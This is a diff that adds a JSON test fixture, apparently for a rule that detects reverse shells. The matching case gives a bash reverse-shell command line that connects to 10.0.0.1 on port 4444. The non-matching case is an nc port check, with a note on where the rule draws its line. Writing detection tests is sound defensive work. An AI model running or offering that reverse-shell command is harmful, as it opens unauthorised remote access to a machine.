@@ -1,0 +1,11 @@
+{
+  "matching": {
+    "image": "/bin/bash",
+    "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+  },
+  "non_matching": {
+    "image": "/usr/bin/nc",
+    "cmdline": "nc -zv host 22",
+    "note": "Near miss: nc used to scan/connect, not to spawn a shell; the rule's boundary is the -e exec flag, not the binary itself."
+  }
+}
